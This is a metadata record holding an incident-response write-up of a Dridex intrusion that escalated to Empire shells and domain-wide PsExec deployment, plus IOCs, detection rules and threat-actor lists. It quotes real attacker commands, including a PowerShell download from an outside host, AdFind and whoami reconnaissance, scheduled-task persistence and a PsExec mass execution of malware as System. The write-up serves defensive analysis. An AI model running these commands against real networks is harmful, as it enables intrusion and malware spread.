{
    "id": "d5a2e9cb-c7b2-4498-8b9f-1f444758c057",
    "created_at": "2023-01-12T15:07:20.961387Z",
    "updated_at": "2025-03-27T02:15:37.956784Z",
    "deleted_at": null,
    "sha1_hash": "8a605d211b35f21782b1f509cb9b1950a710f033",
    "title": "2020-08-03 - Dridex – From Word to Domain Dominance",
    "authors": "",
    "file_creation_date": "2022-05-28T18:02:31Z",
    "file_modification_date": "2022-05-28T18:02:31Z",
    "file_size": 1970194,
    "plain_text": "# Dridex – From Word to Domain Dominance\n\n**[thedfirreport.com/2020/08/03/dridex-from-word-to-domain-dominance/](https://thedfirreport.com/2020/08/03/dridex-from-word-to-domain-dominance/)**\n\nAugust 3, 2020\n\n#### Are you familiar with the pyramid of pain? The idea is that to make life harder for attackers we need to push up the pyramid in our defenses. If they have a playbook, then they will keep using it until we break it.\n\n\n-----\n\n#### We see a good example of this in our Dridex sample. We executed a malicious Word doc in our honeypot which later elevated to multiple Empire shells across the domain as well as additional Dridex installations. The threat actors used well known tools, moved like they were running a playbook, and used an Empire C2 server known to the community for 8 months.\n\n So, what is Dridex?\n\n Dridex also known as Bugat and Cridex is a form of malware that specializes in stealing bank credentials via a system that utilizes macros from Microsoft Word. https://en.wikipedia.org/wiki/Dridex\n\n As we’ve seen over the last few years, Dridex is more than just a banking Trojan.\n\n Cybersecurity industry reporting attributes Dridex, BitPaymer, and Locky campaigns, as well as other massive malware spam (malspam) campaigns to actors known alternately as Evil Corp or TA505. Actors distributing Dridex likely employ ransomware with similar configurations. Code for BitPaymer, also known as Friedex, includes numerous similarities to Dridex, despite its function as ransomware rather than data extraction. The two malwares use the same mechanics for several functions, and the authors compiled the codes at nearly the same time. The ransomware distributed through these malwares has targeted U.S. financial institutions and resulted in data and financial loss. https://us-cert.cisa.gov/ncas/alerts/aa19-339a\n\n More info on Dridex:\n\n Dridex & Locky\n\n\n-----\n\n#### Dridex & BitPaymer\n\n Dridex & EvilCorp\n\n Additional Dridex write-ups on malpedia\n\n### Report Structure:\n\n#### We’ll be trying out the Unified Kill Chain as our flow today.\n\n## Initial Foothold:\n\n### Delivery:\n\n#### Like many threat activities today, this started with delivery of a malicious Word document. See:\n\n July2020_2485413825.doc e3589aa5d687e58ee97bda2c501bcba9d5e942fe929644602dd1645b3c7f0e94\n\n Using olevba to look at the file, we get some clues on the file’s linage and probable execution activity.\n```\nolevba 0.55.1 on Python 3.8.4 - http://decalage.info/python/oletools\nFlags Filename\n----------- ----------------------------------------------------------------OLE:MASIHB-- July2020_2485413825.doc\n(Flags: OpX=OpenXML, XML=Word2003XML, FlX=FlatOPC XML, MHT=MHTML, TXT=Text, M=Macros,\nA=Auto-executable, S=Suspicious keywords, I=IOCs, H=Hex strings, B=Base64 strings,\nD=Dridex strings, V=VBA strings, ?=Unknown)\n\n```\n\n-----\n\n### Persistence:\n\n#### From there, we saw the following scheduled task run on the system, as well as a registry key for persistence.\n\n Schedule Task and Command\n\n\n-----\n\n```\nC:\\\\Windows\\\\system32\\\\schtasks.exe /run /tn \\\"Zvhlxdonjwfvei\\\"\n\"C:\\\\Windows\\\\System32\\\\rundll32.exe\\\" C:/Windows/Temp//rvhz1.dll DllRegisterServer\n\n#### Run Key and Command\n\\HKEY_USERS\\SID\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Zvhlxdonjwfvei\n%APPDATA%\\Microsoft\\SystemCertificates\\My\\CRLs\\swET\\bdechangepin.exe\n\n### Command & Control:\n\n#### As for command and control, from Dridex on the initial infected workstation, we saw it connect on port 443 to the follow any IP’s discovered by the Suricata signature for:\n\n ET TROJAN ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex)\n192.99.103.228\n64.118.8.15\n\n So, while we saw HTTPS encryption on the wire, defenders could catch this activity with freely available IDS rules. See IOCs for rules.\n\n Hours later we saw the system run the following:\nC:\\\\Windows\\\\system32\\\\cmd.exe /c C:\\\\Users\\\\USER~1\\\\AppData\\\\Local\\\\Temp\\\\J10B9.cmd\n&gt; C:\\\\Users\\\\USER~1\\\\AppData\\\\Local\\\\Temp\\\\yp710BA.tmp 2&gt;\nC:\\\\Users\\\\USER~1\\\\AppData\\\\Local\\\\Temp\\\\1N10CB.tmp\n\n The contents of J10B9.cmd made it obvious, we were on to the next stage.\n\n Oh it’s on.\n\n```\n\n-----\n\n## Network Propagation:\n\n### Execution:\n\n#### Below we can see the POST request of the PowerShell encoded command, run by the threat actor, via Dridex. Just looking at the syntax, can you guess what it is?\n\n\n-----\n\n#### We can see that we are looking at the Empire Post Exploitation Framework.\n\n This IP has been running an Empire C2 server since at least December 2019, as scanned by Urlscan and identified by the hash of the default webpage: b8c892fbb49921529be6f6ce17685c31724f76959111b28f39e39dc299b8acaf\n\n\n-----\n\n### Discovery:\n\n#### AdFind was dropped in the C:\\Users\\Public folder using Empire.\n```\n\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -Command \\\"(NewObject\nNet.WebClient).DownloadFile('http://msa.org.in/app/webroot/js/kcfinder/js/AdFind.bin',\n 'c:\\\\Users\\\\Public\\\\adfind.exe'\n\n The following commands were run:\nadfind -f objectcategory=computer -csv name cn OperatingSystem dNSHostName >\nsome.csv\"\nadfind -gcb -sc trustdmp > trustdmp.txt\n\n It appears the attackers were looking for a list of computers and associated trusts. We can see that both command outputs were written to a file. Read more about AdFind recon here.\n\n Both files were then exfiled over the Dridex C2 channel:\n\n```\n\n-----\n\n#### Other noteworthy commands ran during discovery:\n```\nC:\\\\Windows\\\\system32\\\\whoami.exe\" /user\nC:\\\\Windows\\\\system32\\\\whoami.exe\" /groups\n\"C:\\\\Windows\\\\system32\\\\net.exe\" group \"domain admins\" /domain\n\n### Lateral Movement:\n\n#### The threat actors utilized Sysinternals PsExec and Empire to move laterally through the environment.\n\n Soon after Empire’s execution on the entry system, the threat actor attempted to run Empire (via WMI) on all domain-joined systems. A few machines had Defender running, which blocked the execution of Empire. The threat actors successfully got an Empire shell on a few machines as well as a Domain Controller (DC).\n\n Shortly there-after, we see this on the compromised DC.\n\n```\n\n-----\n\n#### They then used PsExec to execute Dridex on additional machines. PsExec was renamed to pse.exe and was downloaded using the below GET request:\n\n Through our investigation, we noticed that the directory where PsExec and AdFind were downloaded from was an open directory, where additional files were stored.\n\n We were not able to acquire all of these files but we were able to access 123.bin, a.txt, ufo.exe, and marple.exe.\n\n a.txt: is a list of 800+ hostnames, most likely from a previous or ongoing attack.\n\n module.php: appears to be a password protected webshell.\n\n marple.exe: is written in Korean, has invalid debug information and contradicting timestamps.\n\n 123 bin has invalid debug information and similar contradicting timestamps\n\n\n-----\n\n#### ufo.exe and 123.bin are very similar. The only difference is the time stamps. This binary contacted 59.148.253[.]194:443 & 2.58.16[.]87:8443.\n\n All three binaries had anti-VM instructions and anti-debugging instructions per capa and would not run in sandboxes. Here is marple.exe\n\n After pulling down PsExec, the threat actor ran the following command.\n```\npse.exe -accepteula @a.txt -c -f -d -s ufo.exe > log.txt\n\n Here’s what that command does:\n\n -accepteula: Suppresses the display of the license dialog.\n\n @file: Execute the command on each of the computers listed in the file.\n\n -c: Copy the specified executable to the remote system for execution.\n\n -f: Copy the specified program even if the file already exists on the remote system.\n\n -d: Don’t wait for process to terminate (non-interactive).\n\n -s: Run the remote process as the System account.\n\n As you can see above, ufo.exe is executed as System across multiple hosts, which is all logged to log.txt. The below snippet is from log.txt, showing that the file was copied/run.\n\n```\n\n-----\n\n```\nStarting PSEXESVC service on hostname...\nConnecting with PsExec service on hostname...\nCopying ufo.exe to hostname...\nStarting ufo.exe on hostname...\n\n#### Unfamiliar with how PsExec works? Here’s a good summation by Guy Leech\n\n So when psexec is used to run something on a remote system, it works by creating a new service executable called psexesvc.exe which is embedded within the original psexec.exe file. This is copied to the Windows folder on the remote machine via the admin$ default share (hence why you need to be an admin to get psexec to work remotely). It then creates the PSEXESVC service with this, now local, executable, starts it and then runs the specified command.\n\n Here we can see psexesvc.exe being copied to the machine over SMB. You can rename but you can’t hide…\n\n After this, we saw Dridex begin beaconing out from hosts that were successfully compromised by this activity, including the DC with a new C2 address of:\n59.148.253.194\n\n Here’s an overview of the lateral movement:\n\n However, their credential dumping attempts failed and the actor eventually dropped their connection to the Empire shell. Regardless, the multiple Dridex infections continued to beacon and would have allowed the actor instant access back into the environment at any\n\n```\n\n-----\n\n#### time.\n\n## Actions on Objectives:\n\n#### In this particular event we did not see final action on objectives. We saw the threat actor attempt (but fail) to dump credentials from a DC multiple times and an attempt to execute Empire and Dridex on most domain joined systems. Although their attempt to dump credentials failed, we hypothesize, based upon what we saw and known similarities to other campaigns, that the likely end state would have been domain wide ransomware.\n\n Here’s a timeline of the major events:\n\n Enjoy our report? Please consider donating $1 or more to the project using Patreon. Thank you for your support!\n\n\n-----\n\n## IOC s:\n\n#### https://misppriv.circl.lu/events/view/69253\n\n https://otx.alienvault.com/pulse/5f29f5a9c10271a69aa246f3\n\n### Network:\n\n#### ET POLICY PsExec service created\n\n ET POLICY SMB2 NT Create AndX Request For an Executable File\n\n ET TROJAN ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex)\n```\n2.58.16.87\n144.168.239.42\n144.168.239.42\n216.52.109.40\n216.52.109.40\n88.129.221.43\n88.129.221.43\n104.131.103.128\n104.131.103.128\n54.39.34.24\n192.99.103.228\n2.80.178.251\n75.170.61.45\n199.66.90.63\n199.66.90.63\n88.129.223.244\n209.74.126.2\n\n Ufo.exe\n59.148.253.194:443\n2.58.16.87:8443\n\n Empire C2\n194.99.22.145\n\n### File:\n123.bin 3994131da9d08aa5ca8b4fc671d4c9db\n55fc3f8108e5a563ea00cd3abc9a5672d3d58ec5\nufo.exe 92cc8b22a89cc560963407b482443b76\n8b0c0b84222571a70ca65c0e3e8cf459c80406fc\nmarple.exe 850c08bf4fc0b063808016adb9446c78\ndee29e6c640fa27b04be486e429fce11fb942ccc\n\n```\n\n-----\n\n```\npse.bin 27304b246c7d5b4e149124d5f93c5b01\ne50d9e3bd91908e13a26b3e23edeaf577fb3a095\nrvhz1.dll db91c4531aa46ce160a71b9c74c800bb\ncf45535c5d392bfd58fb385edb46798d64793d98\nadfind.exe DF5CE1159EF2E257DF92E1825D786D87\nA7E163EAA0FC2AFB9C0D5AC6F79CB3E49919DD3C\n\n## Detections:\n\n### Sigma:\n\n#### Detects the execution of an Empire Launcher\n\n https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_p owershell_empire_launch.yml\n\n Detects the execution of a renamed PsExec\n\n https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_rename d_psexec.yml3\n\n Detects a PsExec service start\n\n https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_psexesv c_start.yml\n\n Detects the execution of whoami\n\n https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_w hoami.yml\n\n Detects Invoke-Mimikatz\n\n https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mimikat z_command_line.yml\n\n Detects AdFind usage from our case:\n\n```\n\n-----\n\n```\ntitle: AdFind Recon\ndescription: Threat Actor using AdFind for reconnaissance.\nauthor: The DFIR Report\ndate: 2019/8/2\nreferences:\n  - https://thedfirreport.com/2020/08/03/dridex-from-word-to-domain-dominance/\ntags:\n  - attack.remote_system_discovery\n  - attack.T1018\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_1:\n    CommandLine|contains:\n      - adfind -f objectcategory=computer\n  selection_2:\n    CommandLine|contains:\n      - adfind -gcb -sc trustdmp\n  condition: selection_1 or selection_2\nfalsepositives:\n  - Legitimate Administrator using tool for Active Directory querying\nlevel: medium\nstatus: experimental\n\n### Suricata:\n\n#### Empire download and beacon (validate upon using as it may only detect older versions of Empire)\n\n https://github.com/ptresearch/AttackDetection/blob/master/PowerShell%20Empire/power_sh ell_empire.rules\n\n### Yara:\n\n```\n\n-----\n\n```\n/\n  YARA Rule Set\n  Author: The DFIR Report\n  Date: 2020-07-29\n  Identifier: dridex-yara\n  Reference: https://thedfirreport.com/2020/08/03/dridex-from-word-to-domaindominance/\n*/\n/* Rule Set ----------------------------------------------------------------- */\nimport \"pe\"\nrule dridex_yara_ufo {\n  meta:\n   description = \"dridex-yara - file ufo.exe\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com/2020/08/03/dridex-from-word-to-domaindominance/\"\n   date = \"2020-07-29\"\n   hash1 = \"5761fd8b454c1121f80019ade53b0815bd0573dac89fe6ecd3198e7d756f1a3a\"\n  strings:\n   $s1 = \"mfRgb.dll\" fullword ascii\n   $s2 = \"TESTAPP.exe\" fullword wide\n   $s3 = \"self.exe\" fullword wide\n   $s4 = \"usersJRB\" fullword wide\n   $s5 = \"j13KAGsE#btwkWcu#unto2!.jT4srFRP.pdb\" fullword ascii\n   $s6 = \"2017,2uchannelsPYDudays\" fullword wide\n   $s7 = \"torrespondedthanfshadow\" fullword wide\n   $s8 = \"increasing.includeda7iexample,Hofgodzilla\" fullword wide\n   $s9 = \"haveand2system-providedreleasenoneJgZtest,\" fullword wide\n   $s10 = \"wsupport3voftenfromR\" fullword wide\n   $s11 = \"tofwerentheFirefox.149simplerunstableqqinformation\" fullword wide\n   $s12 = \"11.172.2.11\" fullword wide\n   $s13 = \"Dinsettheir\" fullword wide\n   $s14 = \"yofthe\" fullword wide\n   $s15 = \"TLty2_J \" fullword ascii\n   $s16 = \"CosZTX^&% \" fullword ascii\n   $s17 = \"Java(TM) Platform SE 8 U172\" fullword wide\n   $s18 = \"4vthethatfour-part\" fullword wide\n   $s19 = \"GkaChrome\" fullword wide\n   $s20 = \"L$<;D$<\" fullword ascii /* Goodware String - occured 1 times */\n  condition:\n   uint16(0) == 0x5a4d and filesize < 600KB and\n   ( pe.imphash() == \"e37c1c1a736faeeff7de27f075619f47\" and pe.exports(\"mvbFp6\")\nor 8 of them )\n}\nrule dridex_cannot_but_soft {\n  meta:\n   description = \"dridex-yara - file cannot_but_soft.xsl\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com/2020/08/03/dridex-from-word-to-domaindominance/\"\n   date = \"2020-07-29\"\n\n```\n\n-----\n\n```\n   hash1 f4b75d4ddcd7b9ff5d7f867d44e4b7236c69e26807b2ca8296df1981aaf336f6\n  strings:\n   $s1 = \"var a_couch_for =\n[\\\"love_is_by\\\",\\\"all_but_keep\\\",\\\"summons_i_th\\\",\\\"humanity_so_we\\\",\\\"thus_hath_fed\\\"\n wide\n   $s2 = \"{var and_light_than =\n[\\\"tween_their_course\\\",\\\"ophelia_distracted\\\",\\\"marriage_and_both\\\",\\\"of_us_grant\\\",\\\n wide\n   $s3 = \"xmlns=\\\"http://www.w3.org/1999/XSL/Transform\\\" xmlns:ms=\\\"urn:schemasmicrosoft-com:xslt\\\" \" fullword wide\n   $s4 = \"while (among_a_father + then_this_be >= new Date().getTime()) {}}\"\nfullword wide\n   $s5 = \"<ms:script implements-prefix=\\\"user\\\" language=\\\"JScript\\\">\" fullword\nwide\n   $s6 = \"]]> </ms:script>\" fullword wide\n   $s7 = \"</ms:script>\" fullword wide\n   $s8 = \"{var among_a_father = new Date().getTime();\" fullword wide\n   $s9 = \"it_so_mope(\\\"rundll32 \\\".concat(locks_to_all.concat(\\\"\n\\\".concat(\\\"DllRegisterServer\\\"))))\" fullword wide\n   $s10 = \"xmlns:user=\\\"placeholder\\\" \" fullword wide\n   $s11 = \"var locks_to_all = \n\\\"C:/Windows/Temp/\\\".concat(\\\"/\\\".concat(my_acquittance))\" fullword wide\n   $s12 = \"{return leaves_in_his.readystate}\" fullword wide\n   $s13 = \"function unproportion_d_no(leaves_in_his)\" fullword wide\n   $s14 = \"run(for_s_purpose)}}\" fullword wide\n   $s15 = \"version=\\\"1.0\\\">\" fullword wide\n   $s16 = \"if(beast_so_as(call_it_an)=== 150+50 && unproportion_d_no(call_it_an)\n=== 1+3)\" fullword wide\n   $s17 = \"var lecture_and_polonius = \\\"wscript.\\\".concat(first_corse_again);\"\nfullword wide\n   $s18 = \"with (now_it_profanely){\" fullword wide\n   $s19 = \"{return of_his_solicitings.status}\" fullword wide\n   $s20 = \"couplets_are_embark.close();\" fullword wide\n  condition:\n   uint16(0) == 0xfeff and filesize < 20KB and\n   8 of them\n}\nrule dridex_yara_marple {\n  meta:\n   description = \"dridex-yara - file marple.exe\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com/2020/08/03/dridex-from-word-to-domaindominance/\"\n   date = \"2020-07-29\"\n   hash1 = \"cb81e371e2a4d3371e051b1f15674ce6cb94e257d28ddc1a5209bb56c71dd27a\"\n  strings:\n   $s1 = \"vplD.dll\" fullword ascii\n   $s2 = \"wtrter.dll\" fullword wide\n   $s3 = \"self.exe\" fullword wide\n   $s4 = \"RRR333\" fullword ascii /* reversed goodware string '333RRR' */\n   $s5 = \"nProtect KeyCrypt Program Database DLL\" fullword wide\n   $s6 = \"VVV&&&\" fullword ascii /* reversed goodware string '&&&VVV' */\n   $s7 = \"PPPPP$\" fullword ascii /* reversed goodware string '$PPPPP' */\n   $s8 = \"LIO.pdb\" fullword ascii\n\n```\n\n-----\n\n```\n   $s9 0!\\ !!! fullword ascii\n   $s10 = \"3930, 00, 0, 0\" fullword wide /* hex encoded string '90' */\n   $s11 = \"))44)44'7+4)?\" fullword ascii /* hex encoded string 'DDt' */\n   $s12 = \"=22222222=\" fullword ascii /* hex encoded string '\"\"\"\"' */\n   $s13 = \"44==========-\" fullword ascii /* hex encoded string 'D' */\n   $s14 = \"7733.--!&\" fullword ascii /* hex encoded string 'w3' */\n   $s15 = \"#44##'&# {\" fullword ascii /* hex encoded string 'D' */\n   $s16 = \"doqdoqdoqdoqdoqdoqdoqdoqdoqdoqdoq\" fullword ascii\n   $s17 = \"doqdoqdoqdoqdoqdoqdoqdoqdoqdoqdoqdoq\" fullword ascii\n   $s18 = \"xwxwwwwwxwxwwwwwxwx\" fullword ascii\n   $s19 = \"wxwxwwwwwxwxwwwwwxwx\" fullword ascii\n   $s20 = \"doqdoqdoqdoq\" fullword ascii\n  condition:\n   uint16(0) == 0x5a4d and filesize < 1000KB and\n   ( pe.imphash() == \"b575de8cf342823d87afbf497885b43d\" and\npe.exports(\"pfrBpdm16\") or 8 of them )\n}\nrule dridex_yara_123 {\n  meta:\n   description = \"dridex-yara - file 123.bin\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com/2020/08/03/dridex-from-word-to-domaindominance/\"\n   date = \"2020-07-29\"\n   hash1 = \"e88dfd4bef8c502ef2b711fd025aa321244dbca1eab80586b07187b3cf261de3\"\n  strings:\n   $s1 = \"mfRgb.dll\" fullword ascii\n   $s2 = \"TESTAPP.exe\" fullword wide\n   $s3 = \"sself.exe\" fullword wide\n   $s4 = \"j13KAGsE#btwkWcu#unto2!.jT4srFRP.pdb\" fullword ascii\n   $s5 = \"11.172.2.11\" fullword wide\n   $s6 = \"a}d+ #\" fullword ascii\n   $s7 = \"Java(TM) Platform SE 8 U172\" fullword wide\n   $s8 = \"Vxkc*P,BNG\" fullword ascii\n   $s9 = \"Fpreferences,betweenpreviouslyX\" fullword wide\n   $s10 = \"anLK'mT\" fullword ascii\n   $s11 = \"LoMo?w\" fullword ascii\n   $s12 = \"FSxH0P;:J\" fullword ascii\n   $s13 = \"-ATXg3\\\"\" fullword ascii\n   $s14 = \"OofPNsPoint\" fullword wide\n   $s15 = \"qrKn!6\" fullword ascii\n   $s16 = \"BinN$L\" fullword ascii\n   $s17 = \"thepwithZthebar\" fullword wide\n   $s18 = \"[email protected]\" fullword ascii\n   $s19 = \"HgWVIbD\" fullword ascii\n   $s20 = \"'JZCnX;}p{\" fullword ascii\n  condition:\n   uint16(0) == 0x5a4d and filesize < 600KB and\n   ( pe.imphash() == \"261439292fcce3e9d2f6f3cdfbf610b2\" and pe.exports(\"mvbFp6\")\nor 8 of them )\n}\n\n```\n\n-----\n\n```\nrule dridex_yara_rvhz1 {\n  meta:\n   description = \"dridex-yara - file rvhz1.dll\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com/2020/08/03/dridex-from-word-to-domaindominance/\"\n   date = \"2020-07-29\"\n   hash1 = \"076547c290c80627993690a9e6c15eeb2ac9b86a9a33af2d3dbaab135f1f43ab\"\n  strings:\n   $s1 = \"c:\\\\Cover\\\\particular\\\\Mind\\\\Difficult\\\\engine\\\\Tool\\\\Under.pdb\"\nfullword ascii\n   $s2 = \"constructor or from DllMain.\" fullword ascii\n   $s3 = \"3.2.4.465\" fullword wide /* hex encoded string '2De' */\n   $s4 = \"576=6_6}6\" fullword ascii /* hex encoded string 'Wff' */\n   $s5 = \":*:1:G:\\\\:b:k:r:\" fullword ascii\n   $s6 = \":Q:V:\\\\:z:\" fullword ascii\n   $s7 = \"xzRamj6\" fullword ascii\n   $s8 = \"VVtW;' \" fullword ascii\n   $s9 = \"History Kill Few\" fullword wide\n   $s10 = \" 1999-2017 History Kill Few, Inc.\" fullword wide\n   $s11 = \"hExpY^f\" fullword ascii\n   $s12 = \"<'<9<B<N<W<^<h<n<t<\" fullword ascii /* Goodware String - occured 1\ntimes */\n   $s13 = \"4*6_6x6\" fullword ascii /* Goodware String - occured 1 times */\n   $s14 = \"YYuTVWh-;B\" fullword ascii\n   $s15 = \"VWncmd\" fullword ascii\n   $s16 = \"PtVM3udP\" fullword ascii\n   $s17 = \"hWtjCFONu\" fullword ascii\n   $s18 = \"YEPY'aB\" fullword ascii\n   $s19 = \"RISP/6.\" fullword ascii\n   $s20 = \"nSdvxP,\" fullword ascii\n  condition:\n   uint16(0) == 0x5a4d and filesize < 1000KB and\n   ( pe.imphash() == \"1dfcf659cd022725d2a87599a5697d53\" or 8 of them )\n}\n/* Super Rules ------------------------------------------------------------- */\nrule _ufo_123_0 {\n  meta:\n   description = \"dridex-yara - from files ufo.exe, 123.bin\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com/2020/08/03/dridex-from-word-to-domaindominance/\"\n   date = \"2020-07-29\"\n   hash1 = \"5761fd8b454c1121f80019ade53b0815bd0573dac89fe6ecd3198e7d756f1a3a\"\n   hash2 = \"e88dfd4bef8c502ef2b711fd025aa321244dbca1eab80586b07187b3cf261de3\"\n  strings:\n   $s1 = \"mfRgb.dll\" fullword ascii\n   $s2 = \"TESTAPP.exe\" fullword wide\n   $s3 = \"j13KAGsE#btwkWcu#unto2!.jT4srFRP.pdb\" fullword ascii\n   $s4 = \"11.172.2.11\" fullword wide\n   $s5 = \"Java(TM) Platform SE 8 U172\" fullword wide\n   $s6 = \"jp2native\" fullword wide /* Goodware String - occured 2 times */\n   $s7 = \"jp2native.dll\" fullword wide /* Goodware String - occured 2 times */\n\n```\n\n-----\n\n```\n   $s8 mvbFp6 fullword ascii\n   $s9 = \"8.0.1720.11\" fullword wide\n  condition:\n   ( uint16(0) == 0x5a4d and filesize < 600KB and ( all of them )\n   ) or ( all of them )\n}\n\n#### internal case 1002\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-08-03 - Dridex – From Word to Domain Dominance.pdf"
    ],
    "report_names": [
        "2020-08-03 - Dridex – From Word to Domain Dominance.pdf"
    ],
    "threat_actors": [
        {
            "id": "6c4f98b3-fe14-42d6-beaa-866395455e52",
            "created_at": "2023-01-06T13:46:39.169554Z",
            "updated_at": "2025-03-27T02:00:03.011739Z",
            "deleted_at": null,
            "main_name": "Evil Corp",
            "aliases": [
                "GOLD DRAKE"
            ],
            "source_name": "MISPGALAXY:Evil Corp",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "50068c14-343c-4491-b568-df41dd59551c",
            "created_at": "2022-10-25T15:50:23.253218Z",
            "updated_at": "2025-03-27T02:00:55.408128Z",
            "deleted_at": null,
            "main_name": "Indrik Spider",
            "aliases": [
                "Indrik Spider",
                "Evil Corp",
                "Manatee Tempest",
                "DEV-0243",
                "UNC2165"
            ],
            "source_name": "MITRE:Indrik Spider",
            "tools": [
                "Mimikatz",
                "PsExec",
                "Dridex",
                "WastedLocker",
                "BitPaymer",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9806f226-935f-48eb-b138-6616c9bb9d69",
            "created_at": "2022-10-25T16:07:23.73153Z",
            "updated_at": "2025-03-27T02:02:09.950784Z",
            "deleted_at": null,
            "main_name": "Indrik Spider",
            "aliases": [
                "Blue Lelantos",
                "DEV-0243",
                "Evil Corp",
                "Gold Drake",
                "Gold Winter",
                "Manatee Tempest",
                "UNC2165"
            ],
            "source_name": "ETDA:Indrik Spider",
            "tools": [
                "Advanced Port Scanner",
                "Agentemis",
                "Babuk",
                "Babuk Locker",
                "Babyk",
                "BitPaymer",
                "Bugat",
                "Bugat v5",
                "Cobalt Strike",
                "CobaltStrike",
                "Cridex",
                "Dridex",
                "EmPyre",
                "EmpireProject",
                "FAKEUPDATES",
                "FakeUpdate",
                "Feodo",
                "FriedEx",
                "Hades",
                "IEncrypt",
                "LINK_MSIEXEC",
                "MEGAsync",
                "Macaw Locker",
                "Metasploit",
                "Mimikatz",
                "PayloadBIN",
                "Phoenix Locker",
                "PowerShell Empire",
                "PowerSploit",
                "PsExec",
                "QNAP-Worm",
                "Raspberry Robin",
                "RaspberryRobin",
                "SocGholish",
                "Vasa Locker",
                "WastedLoader",
                "WastedLocker",
                "cobeacon",
                "wp_encrypt"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b296f34c-c424-41da-98bf-90312a5df8ef",
            "created_at": "2024-06-19T02:03:08.027585Z",
            "updated_at": "2025-03-27T02:05:17.350153Z",
            "deleted_at": null,
            "main_name": "GOLD DRAKE",
            "aliases": [
                "Indrik Spider ",
                "Evil Corp"
            ],
            "source_name": "Secureworks:GOLD DRAKE",
            "tools": [
                " Cobalt Strike",
                " Covenant",
                " Donut",
                " Dridex",
                " Hades",
                " Koadic",
                " LockBit",
                " Macaw Locker",
                " Mimikatz",
                " Payload.Bin",
                " Phoenix CryptoLocker",
                " PowerSploit",
                " Powershell Empire",
                " SocGholish",
                " WastedLocker",
                "BitPaymer"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
